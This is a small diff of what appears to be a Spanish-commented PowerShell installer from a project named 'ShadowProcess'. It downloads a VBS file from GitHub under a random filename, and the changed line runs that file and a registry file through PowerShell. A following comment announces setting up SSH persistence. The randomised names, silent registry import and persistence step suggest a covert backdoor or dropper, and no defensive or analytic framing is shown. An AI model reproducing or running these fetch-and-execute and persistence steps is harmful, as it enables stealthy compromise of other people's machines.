@@ -49,7 +49,7 @@ $vbs_file = random_text
 Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/confirm.vbs -OutFile "$vbs_file.vbs"
 
 #instalando registro
-./"$reg_file.reg";"$vbs_file.vbs"
+powershell .\"$reg_file.reg";powershell .\"$vbs_file.vbs"
 
 
 # estableciendo persistencia ssh
